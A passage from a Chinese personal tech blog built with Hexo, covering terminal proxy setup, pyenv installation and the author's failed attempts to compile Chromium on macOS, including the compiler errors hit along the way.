<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">"http://10.211.55.2:1087"</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">"http://10.211.55.2:1087"</span></span><br></pre></td></tr></table></figure>
<p>最后<code>curl ip.gs</code>看看</p>
<p><del>再吐槽一句，windows的VMware里的代理设置死活不对，mac+pd一下就好了</del></p>
<p><del>windows唯一能吸引我的大概就是能写C++的visual studio了</del></p>
<h1 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/yyuu/pyenv.git ~/.pyenv</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=~/.pyenv/bin:$PATH'</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PYENV_ROOT=~/.pyenv'</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'eval "$(pyenv init -)"'</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc 								//激活pyenv</span><br></pre></td></tr></table></figure>
<p>然后pip安装virtualenv</p>
<p>创建环境<code>pyenv install 3.6.4 -v</code></p>
<p>查看目前终端 <code>echo $SHELL</code></p>
<p>安装pyenv-virtualenv 插件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/yyuu/pyenv-virtualenv.git ~/.pyenv/plugins/pyenv-virtualenv</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'eval "$(pyenv virtualenv-init -)"'</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">exec</span> <span class="variable">$SHELL</span>				//重启shell</span><br></pre></td></tr></table></figure>
<p>创建环境</p>
<p><code>pyenv virtualenv 3.6.4 py3.6.4</code></p>
<p>激活环境</p>
<p><code>pyenv activate py3.6.4</code></p>
<p>退出环境</p>
<p><code>pyenv deactivate</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/01/mac编译chromium/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="purecall">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="vct的演算纸">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/01/mac编译chromium/" itemprop="url">mac编译chromium</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-01T15:31:31+08:00">
                2019-01-01
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2019/01/01/mac编译chromium/" class="leancloud_visitors" data-flag-title="mac编译chromium">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>mac用起来是真的流畅，触摸板的精确度比以前的电脑高了几十倍…</p>
<p>hexo 三条命令基本都是秒完成</p>
<p>pd里开虚拟机，win10启动2秒，ubuntu1秒，同时开2个win10都不卡….不过有时候windows抽风会让风扇转起来…</p>
<p>git代理和终端代理的问题</p>
<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> http_proxy=http:<span class="comment">//127.0.0.1:1087  </span></span><br><span class="line"><span class="keyword">export</span> https_proxy=http:<span class="comment">//127.0.0.1:1087</span></span><br><span class="line"></span><br><span class="line">git <span class="keyword">config</span> --<span class="keyword">global</span> http<span class="variable">.https</span>:<span class="comment">//github.com.proxy socks5://127.0.0.1:1086</span></span><br><span class="line">git <span class="keyword">config</span> --<span class="keyword">global</span> https<span class="variable">.https</span>:<span class="comment">//github.com.proxy socks5://127.0.0.1:1086</span></span><br></pre></td></tr></table></figure>
<p><strong>终端环境变量翻墙</strong></p>
<blockquote>
<p>后面gclient sync的时候会说不支持http代理什么的，我是在depot_tools/目录下新建了一个http_proxy.boto，然后export NO_AUTH_BOTO_CONFIG=~/depot_tools/http_proxy.boto </p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[BOTO]</span><br><span class="line">proxy = 127.0.0.1</span><br><span class="line">proxy = 1087</span><br></pre></td></tr></table></figure>
<p><del>哪个**说要unset http_proxy; unset https_proxy的</del></p>
<p>还有就是终端只需要一个depot_tools目录的环境变量….现在知道了…都是暂时的</p>
<p> <code>export PATH=&quot;$PATH:/Users/vct/depot_tools&quot;</code> </p>
<p>用mac编译的第一天再次以失败告终</p>
<p><code>../../third_party/blink/renderer/platform/shared_buffer.h:38:10: fatal error: &#39;third_party/blink/renderer/platform/wtf/std_lib_extras.h&#39; file not found</code></p>
<p>第二次编译</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..<span class="regexp">/../</span>third_party<span class="regexp">/blink/</span>renderer<span class="regexp">/platform/</span>blob<span class="regexp">/blob_data.h:43:10: fatal error: 'third_party/</span>blink<span class="regexp">/renderer/</span>platform<span class="regexp">/wtf/</span>threading_primitives.h<span class="string">' file not found</span></span><br></pre></td></tr></table></figure>
<p>反正我现在也只会</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gclient <span class="keyword">sync</span></span><br><span class="line">gclient runhooks</span><br></pre></td></tr></table></figure>
<p>然后搞了半天，又出现了第一天的错误std_lib_extras……</p>
<p>我tm…</p>
<p>调完boto后，又报了个新的错</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">../../third_party/<span class="built_in">blink</span>/renderer/platform/graphics/<span class="built_in">image</span>.h:<span class="number">39</span>:<span class="number">10</span>: fatal error: <span class="string">'third_party/blink/renderer/platform/graphics/paint/paint_image.h'</span> file <span class="keyword">not</span> found</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"third_party/blink/renderer/platform/graphics/paint/paint_image.h"</span></span></span><br></pre></td></tr></table></figure>
<p>我疯了。。。</p>
<p>我重新fetch好了吧。。。</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal <span class="literal">error</span>: cannot <span class="keyword">open</span> <span class="keyword">file</span> '/Users/vct/chromium/src/<span class="keyword">out</span>/<span class="keyword">Default</span>/../../third_party/llvm-build/<span class="keyword">Release</span>+Asserts/lib/clang/<span class="number">8.0</span>.<span class="number">0</span>/include/limits.h': Too many <span class="keyword">open</span> files</span><br></pre></td></tr></table></figure>
<p>忍不住满口脏话…</p>
<p>我不编译了行了吧…</p>
<p>浪费2天，官网就不能维护一下工具吗！！！</p>
<p><code>rm -rf chromium/</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="purecall">
            
              <p class="site-author-name" itemprop="name">purecall</p>
              <p class="site-description motion-element" itemprop="description">C++/pwn/RE</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">15</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友链
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://home.uns3t.cn/" title="uns3t" target="_blank">uns3t</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">purecall</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("f2768dLXYictQUBNihk9Y2P2-gzGzoHsz", "OuqhScK2sm6txyU3yv77JFWd");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
  


  

  

</body>
</html>
